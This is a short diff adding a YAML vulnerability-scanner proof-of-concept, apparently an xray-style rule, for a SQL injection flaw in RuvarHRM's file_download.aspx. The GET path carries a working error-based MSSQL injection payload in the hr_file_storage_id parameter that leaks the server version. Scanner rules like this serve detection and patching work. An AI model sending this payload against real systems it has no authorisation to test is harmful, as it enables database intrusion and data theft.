@@ -1,0 +1,12 @@
+name: poc-yaml-ruvarhrm-filedownload-sqli
+
+rules:
+  - method: GET
+    path: /RuvarHRM/web_common/file_download.aspx?hr_file_storage_id=1')and 1=convert(int,(char(71)+char(65)+char(79)+char(32)+char(74)+char(73)+char(64)+@@version ))--
+    expression: |
+      response.status == 200 && response.body.bcontains(b"GAO JI@Microsoft SQL Server")
+detail:
+  author: durkworf(https://github.com/durkworf)
+  links:
+    - https://github.com/epony4c
+    - https://vulners.com/seebug/SSV:91623/
